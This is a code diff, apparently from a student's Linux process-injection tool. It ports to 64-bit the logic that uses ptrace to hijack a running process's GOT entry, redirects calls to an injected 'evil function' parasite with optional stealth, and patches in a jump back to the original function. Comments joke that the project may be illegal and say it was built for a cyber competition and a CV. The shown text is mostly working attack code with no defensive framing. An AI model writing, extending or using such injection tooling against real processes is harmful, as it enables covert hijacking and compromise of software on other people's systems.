@@ -1829,8 +2182,8 @@ ae_get_pie_base(int pid)
 	return base;
 }
 
-
-/* Find a writable memory region from /proc/pid/maps */
+// Just realized this project could be a lil illegal ahem... JUST FOR EDUCATIONAL PURPORSES POLICE OFFICER
+/* find a writable memory region from /proc/pid/maps */
 static ulong_t
 ae_find_writable_region(int pid, size_t size)
 {
@@ -1843,14 +2196,14 @@ ae_find_writable_region(int pid, size_t size)
 	if (!f)
 		return 0;
 	
-	/* Look for a writable mapping (rw-p or rw-) */
+	/* look for a writable mapping (rw-p or rw-) */
 	while (fgets(line, sizeof(line), f)) {
 		if (strstr(line, " rw-p ") || strstr(line, " rw- ")) {
-			/* Parse start-end addresses */
+			/* parse start-end addresses */
 			if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
 				if ((end - start) >= size) {
 					fclose(f);
-					/* Return address in the middle of the region */
+					/* return address in the middle of the region */
 					return start + ((end - start) / 2);
 				}
 			}
@@ -1905,8 +2258,8 @@ int
 main (int argc, char **argv)
 {
 	uchar_t * mem = NULL;
-	Elf32_Ehdr *ehdr;
-	Elf32_Addr ret;
+	void *ehdr;
+	uintptr_t ret;
 	ulong_t evilfunc;
 	ulong_t evilbase;
 	struct ae_sym_info * sinfo;
@@ -1931,7 +2284,7 @@ main (int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 
-	ehdr = (Elf32_Ehdr *)mem;
+	ehdr = (void *)mem;
 
 	if (!ae_good_elf(ehdr, &opt)) {
 		ae_log(AE_LOG_ERROR, "ELF verification failed");
@@ -2055,24 +2408,38 @@ main (int argc, char **argv)
 	} 
 
 	if (!opt.stealth)
-		ae_log(AE_LOG_DEBUG, "New GOT value: %x", ret);
+		ae_log(AE_LOG_DEBUG, "New GOT value: 0x%lx", (unsigned long)ret);
 
-	// find transfer code pattern in our evil function and patch it with original function addr
-	// copy our evil function code from target process so we can search for the transfer code pattern
+	/* copy our evil function code from target process so we can search for the transfer code pattern */
 	ae_ptrace_cpy_from((ulong_t*)evil_code, evilfunc, MAXBUF, opt.pid);
 
-	// pattern \xc7\x45\xf4\x00 is mov [ebp-0xc], 0x00000000
-	// we patch the 4-byte immediate (the zeros) with original function addr
-	// search for the pattern byte by byte
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	/* 64-bit: pattern is 48 b8 00 00 00 00 00 00 00 00 (movabs $0x0, %rax)
+	 * tc from ae_signatures_64.h contains the pattern bytes to search for
+	 * After finding the pattern, we patch the 8-byte immediate */
+	size_t tc_len = sizeof(tc) - 1;
+	for (int i = 0; i < MAXBUF - (int)tc_len - 8; i++) {
+		if (memcmp(&evil_code[i], tc, tc_len) == 0) {
+			if (!opt.stealth)
+				ae_log(AE_LOG_DEBUG, "Located 64-bit transfer code at offset %d. Patching with %lx", i, ae_original);
+			/* patch the 8 bytes after the movabs opcode (the immediate value) */
+			injection_vaddr = evilfunc + i + tc_len;
+			break;
+		}
+	}
+#else
+	/* 32-bit: pattern \xc7\x45\xf4\x00 is mov [ebp-0xc], 0x00000000
+	 * search for the pattern byte by byte */
 	for (int i = 0; i < MAXBUF - 4; i++) {
 		if (memcmp(&evil_code[i], tc, 4) == 0) {
 			if (!opt.stealth)
 				ae_log(AE_LOG_DEBUG, "Located transfer code at offset %d. Patching with %lx", i, ae_original);
-			// patch the 4 bytes after the mov instruction (the immediate value)
+			/* patch the 4 bytes after the mov instruction (the immediate value) */
 			injection_vaddr = evilfunc + i + 4;
 			break;
 		}
 	}
+#endif
 
 	if (!injection_vaddr) {
 		ae_log(AE_LOG_DEBUG, "Could not locate transfer code within parasite (this is OK if you don't need to call original function)");
@@ -2086,7 +2453,12 @@ main (int argc, char **argv)
 			if (128 % 16 != 0) fprintf(stderr, "\n");
 		}
 	} else {
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+		/* 64-bit: patch 8 bytes */
+		ptrace(PTRACE_POKETEXT, opt.pid, injection_vaddr, ae_original);
+#else
 		ae_inject_transfer_code(opt.pid, injection_vaddr, ae_original);
+#endif
 	}
 
 done:
@@ -2097,3 +2469,6 @@ out_err:
 	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
 	return EXIT_FAILURE;
 }
+
+//  im actually not as stupid as i thought i was
+// Also i did this project for ECSC and the mentors are hyping me up like too young for top 10 but hey yall basically wanna groom me so in 2 years time ima be a cyber genius i made this project for my cv and so yall accept me so u better do.. pls
